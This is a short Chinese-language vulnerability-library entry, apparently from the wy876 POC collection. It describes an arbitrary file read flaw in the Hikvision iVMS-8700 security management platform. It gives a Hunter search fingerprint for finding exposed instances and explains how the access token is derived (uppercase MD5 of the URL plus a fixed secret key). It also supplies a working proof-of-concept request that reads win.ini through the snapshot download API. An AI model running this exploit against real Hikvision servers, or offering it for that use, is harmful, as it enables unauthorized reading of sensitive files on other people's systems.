---
fofa: "app.name=="
source: "wy876 漏洞文库"
---

# 海康威视 iVMS-8700综合安防管理平台 download 任意文件下载

# 一、漏洞简介
HIKVISION iVMS-8700综合安防管理平台存在任意文件读取漏洞，攻击者通过发送特定的请求包可以读取服务器中的敏感文件获取服务器信息

# 二、影响版本
+ HIKVISION iVMS-8700综合安防管理平台

# 三、资产测绘
+ hunter：`app.name=="Hikvision 海康威视 iVMS"`


+ 登录页面


# 四、漏洞复现
poc，token为`url+secretKeyIbuilding`进行MD5加密（**32位大写**）

```plain
/eps/api/triggerSnapshot/download?token=xxx&fileUrl=file:///C:/windows/win.ini&fileName=1 
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/okdesxq0iuq0sfkb>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
